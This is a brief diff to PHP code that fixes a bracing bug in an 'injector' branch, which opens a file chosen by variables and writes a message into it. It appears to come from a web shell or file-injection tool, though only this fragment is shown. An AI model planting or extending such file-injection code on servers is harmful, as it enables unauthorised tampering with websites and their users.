@@ -1352,7 +1352,11 @@ else if(isset($_GET['injector']))
                     <?php
                     echo "\n";
                     $fd = fopen($dir.$file,$mode);
-		    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>"; break;
+		    if (!$fd)
+		    {
+		    	echo "<p class='alert_red'>Permission Denied</p>"; 
+		    	break;
+		    }
                     fwrite($fd,$message);
                 }
             }
